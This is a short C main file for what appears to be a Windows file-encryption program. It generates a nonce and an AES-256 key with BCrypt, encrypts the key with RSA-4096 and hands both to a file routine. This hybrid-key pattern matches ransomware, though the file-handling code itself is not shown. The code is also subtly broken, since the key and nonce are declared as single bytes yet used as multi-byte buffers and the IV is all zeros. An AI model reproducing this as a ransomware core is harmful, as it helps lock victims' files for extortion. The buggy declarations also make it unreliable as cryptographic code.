#include "print.h"
#include "aes.h"
#include "rsa.h"
#include "file.h"
#include "crng.h"
#include "main.h"
#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

BYTE AES256Key = { 0, };
BYTE Nonce = { 0, };
BYTE copyNonce[8] = {0,};
PBYTE cipherkey = { 0, };
DWORD cipherkeyLength = 0;
PBYTE ciphertext = { 0, };
DWORD ciphertextLength = 0;
BYTE IV[16] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
BYTE AES256Key2[32] = {0,};
BYTE savecipherkey[512] = { 0, };

// ===============================================================================
// MAIN
// ===============================================================================
int main()
{


    // NONCE GEN
    BCRYPT_ALG_HANDLE RNG_HANDLE = NULL;
    GET_ALG_NONCE_HANDLE(&RNG_HANDLE);
    GEN_RANDOM_NONCE(RNG_HANDLE, &Nonce);
    BCryptCloseAlgorithmProvider(RNG_HANDLE, 0);

    // KEY GEN
    RNG_HANDLE = NULL;
    GET_ALG_KEY_HANDLE(&RNG_HANDLE);
    GEN_RANDOM(RNG_HANDLE,  &AES256Key);
    BCryptCloseAlgorithmProvider(RNG_HANDLE, 0);

    // RSA
    BCRYPT_ALG_HANDLE RSA_ALG = NULL;
    GET_ALG_RSA_HANDLE(&RSA_ALG);
    RSA_4096_Enc(RSA_ALG);
    BCryptCloseAlgorithmProvider(RSA_ALG, 0);

    FileSetting(&Nonce, &AES256Key, cipherkey, cipherkeyLength);
    free(cipherkey);


    return 0;
}